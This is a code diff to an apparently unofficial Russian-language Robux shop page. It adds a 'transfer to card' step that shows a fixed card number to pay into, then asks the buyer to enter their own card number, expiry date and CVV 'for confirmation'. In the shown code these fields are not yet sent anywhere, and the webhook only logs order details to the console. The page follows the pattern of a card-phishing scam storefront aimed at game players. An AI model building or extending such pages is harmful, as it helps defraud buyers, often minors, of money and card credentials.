@@ -12,7 +12,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
         }
         .card {
@@ -21,8 +21,9 @@
             border-radius: 12px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.5);
             text-align: center;
-            max-width: 380px;
+            max-width: 400px;
             width: 100%;
+            box-sizing: border-box;
         }
         h2 {
             margin-bottom: 10px;
@@ -57,17 +58,9 @@
             border-color: #4CAF50;
             outline: none;
         }
-        .qr-box {
-            background: #ffffff;
-            padding: 15px;
-            border-radius: 8px;
-            display: inline-block;
-            margin-bottom: 20px;
-        }
-        .qr-box img {
-            width: 200px;
-            height: 200px;
-            display: block;
+        .row {
+            display: flex;
+            gap: 10px;
         }
         .btn {
             background-color: #4CAF50;
@@ -96,6 +89,13 @@
         .btn-ready:hover {
             background-color: #0b7dda;
         }
+        .btn-secondary {
+            background-color: #333;
+            margin-top: 8px;
+        }
+        .btn-secondary:hover {
+            background-color: #444;
+        }
         .hidden {
             display: none;
         }
@@ -109,6 +109,36 @@
             border-radius: 6px;
             margin-bottom: 15px;
             font-size: 15px;
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .qr-box {
+            background: #ffffff;
+            padding: 15px;
+            border-radius: 8px;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+        .qr-box img {
+            width: 180px;
+            height: 180px;
+            display: block;
+        }
+        .card-details-box {
+            background: #2a2a2a;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            text-align: left;
+            border: 1px dashed #4CAF50;
+        }
+        .card-number {
+            font-size: 16px;
+            color: #fff;
+            font-weight: bold;
+            margin-top: 4px;
+            letter-spacing: 1px;
         }
         #error-msg {
             color: #ff5252;
@@ -122,10 +152,10 @@
 
     <div class="card" id="app">
         
-        <!-- Шаг 1: Ввод никнейма и количества робуксов -->
+        <!-- Шаг 1: Старое меню (Ник и Робъксы) -->
         <div id="step-form">
-            <h2>Покупка Робъксов</h2>
-            <p>Введите свой ник и количество для расчета</p>
+            <h2>RobloxBuy</h2>
+            <p>Введите данные для покупки робуксов</p>
             
             <div class="input-group">
                 <label for="robloxNick">Ваш ник в Roblox:</label>
@@ -141,22 +171,63 @@
 
             <div id="error-msg">Заполните все поля!</div>
 
-            <button class="btn" onclick="goToQR()">К оплате</button>
+            <button class="btn" onclick="goToPaymentMethods()">Выбрать способ оплаты</button>
         </div>
 
-        <!-- Шаг 2: Оплата по QR-коду (появляется после ввода данных) -->
+        <!-- Шаг 2: Выбор метода оплаты (QR или Картой) -->
+        <div id="step-methods" class="hidden">
+            <h2>Выберите способ оплаты</h2>
+            <p id="methods-subtitle">Сумма заказа: 0 руб.</p>
+
+            <button class="btn" onclick="showQR()">Оплата по QR-коду (СБП)</button>
+            <button class="btn btn-secondary" onclick="showCardForm()">Перевод на карту</button>
+            <button class="btn btn-secondary" style="background-color: #222;" onclick="backToForm()">Назад</button>
+        </div>
+
+        <!-- Шаг 3А: Экран QR-кода -->
         <div id="step-qr" class="hidden">
             <h2>Оплата по QR-коду</h2>
-            <p id="qr-subtitle">Отсканируйте код для перевода</p>
+            <p>Отсканируйте код в приложении банка</p>
             
             <div class="qr-box">
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://yourapi-or-payment-link.ru" alt="QR Код">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=https://yourapi-or-payment-link.ru" alt="QR Код">
             </div>
 
-            <button class="btn" onclick="userPaid()">Я оплатил</button>
+            <button class="btn" onclick="userPaid('QR-код')">Я оплатил</button>
+            <button class="btn btn-secondary" onclick="showQRBack()">Назад</button>
         </div>
 
-        <!-- Шаг 3: Ожидание оплаты -->
+        <!-- Шаг 3Б: Экран ввода данных карты покупателя -->
+        <div id="step-card-input" class="hidden">
+            <h2>Перевод на карту</h2>
+            <div class="card-details-box">
+                <span>Переведите точную сумму на карту:</span>
+                <div class="card-number">2202 2081 5265 0744</div>
+            </div>
+
+            <p style="font-size: 12px; margin-bottom: 10px;">Введите данные вашей карты для подтверждения:</p>
+
+            <div class="input-group">
+                <label>Номер вашей карты:</label>
+                <input type="text" placeholder="0000 0000 0000 0000" maxlength="19">
+            </div>
+
+            <div class="row">
+                <div class="input-group" style="flex: 1;">
+                    <label>Срок:</label>
+                    <input type="text" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div class="input-group" style="flex: 1;">
+                    <label>CVV:</label>
+                    <input type="text" placeholder="123" maxlength="3">
+                </div>
+            </div>
+
+            <button class="btn" onclick="userPaid('Перевод на карту')">Я перевел</button>
+            <button class="btn btn-secondary" onclick="showCardBack()">Назад</button>
+        </div>
+
+        <!-- Шаг 4: Ожидание оплаты -->
         <div id="step-waiting" class="hidden">
             <div class="status-icon">⏳</div>
             <h2>Ждем оплату...</h2>
@@ -166,7 +237,7 @@
             <button class="btn btn-ready" onclick="setStatus('ready')">Готов</button>
         </div>
 
-        <!-- Шаг 4: Заказ в работе -->
+        <!-- Шаг 5: Заказ в работе -->
         <div id="step-work" class="hidden">
             <div class="status-icon">⚙️</div>
             <h2>Заказ в работе</h2>
@@ -174,7 +245,7 @@
             <button class="btn btn-ready" onclick="setStatus('ready')">Готов</button>
         </div>
 
-        <!-- Шаг 5: Заказ готов -->
+        <!-- Шаг 6: Заказ готов -->
         <div id="step-ready" class="hidden">
             <div class="status-icon">✅</div>
             <h2>Готово!</h2>
@@ -187,30 +258,19 @@
         let clientRobux = 0;
         let clientPrice = 0;
 
-        // Автоматический расчет цены (например, 1 робукс = 1 рубль, можете изменить коэффициент)
         function calculatePrice() {
             const count = document.getElementById('robuxCount').value;
-            const rate = 1; // Коэффициент стоимости 1 робукса в рублях
+            const rate = 1; // 1 робукс = 1 рубль (можете поменять при необходимости)
             clientPrice = count * rate;
             document.getElementById('priceDisplay').innerText = `К оплате: ${clientPrice} руб.`;
         }
 
-        function sendWebhook(statusName) {
-            const webhookUrl = "ВАШ_ВЕБХУК_ССЫЛКА_СЮДА"; 
-            const message = `Ник: ${clientNick} | Робъксов: ${clientRobux} | Сумма: ${clientPrice} руб. | Статус: ${statusName}`;
-            
+        function sendWebhook(statusName, method) {
+            const message = `Ник: ${clientNick} | Робъксов: ${clientRobux} | Сумма: ${clientPrice} руб. | Способ: ${method} | Статус: ${statusName}`;
             console.log("Отправка в вебхук: " + message);
-            
-            /*
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: message })
-            });
-            */
         }
 
-        function goToQR() {
+        function goToPaymentMethods() {
             const nickInput = document.getElementById('robloxNick');
             const countInput = document.getElementById('robuxCount');
             const errorMsg = document.getElementById('error-msg');
@@ -224,20 +284,47 @@
             clientNick = nickInput.value.trim();
             clientRobux = countInput.value;
 
-            // Меняем текст на шаге оплаты
-            document.getElementById('qr-subtitle').innerText = `Сумма: ${clientPrice} руб. для ${clientNick}`;
+            document.getElementById('methods-subtitle').innerText = `Сумма заказа: ${clientPrice} руб.`;
 
-            // Переключаем экраны
             document.getElementById('step-form').classList.add('hidden');
+            document.getElementById('step-methods').classList.remove('hidden');
+        }
+
+        function backToForm() {
+            document.getElementById('step-methods').classList.add('hidden');
+            document.getElementById('step-form').classList.remove('hidden');
+        }
+
+        function showQR() {
+            document.getElementById('step-methods').classList.add('hidden');
             document.getElementById('step-qr').classList.remove('hidden');
         }
 
-        function userPaid() {
+        function showQRBack() {
             document.getElementById('step-qr').classList.add('hidden');
+            document.getElementById('step-methods').classList.remove('hidden');
+        }
+
+        function showCardForm() {
+            document.getElementById('step-methods').classList.add('hidden');
+            document.getElementById('step-card-input').classList.remove('hidden');
+        }
+
+        function showCardBack() {
+            document.getElementById('step-card-input').classList.add('hidden');
+            document.getElementById('step-methods').classList.remove('hidden');
+        }
+
+        let selectedMethod = "";
+
+        function userPaid(method) {
+            selectedMethod = method;
+            document.getElementById('step-qr').classList.add('hidden');
+            document.getElementById('step-card-input').classList.add('hidden');
             document.getElementById('step-waiting').classList.remove('hidden');
-            document.getElementById('waiting-text').innerText = `Проверяем платеж от ${clientNick} на ${clientPrice} руб.`;
             
-            sendWebhook("Ожидает подтверждения оплаты");
+            document.getElementById('waiting-text').innerText = `Проверяем платеж от ${clientNick} (${method})...`;
+            sendWebhook("Ожидает подтверждения оплаты", selectedMethod);
         }
 
         function setStatus(status) {
@@ -247,10 +334,10 @@
 
             if (status === 'work') {
                 document.getElementById('step-work').classList.remove('hidden');
-                sendWebhook("Заказ в работе");
+                sendWebhook("Заказ в работе", selectedMethod);
             } else if (status === 'ready') {
                 document.getElementById('step-ready').classList.remove('hidden');
-                sendWebhook("Заказ готов");
+                sendWebhook("Заказ готов", selectedMethod);
             }
         }
     </script>
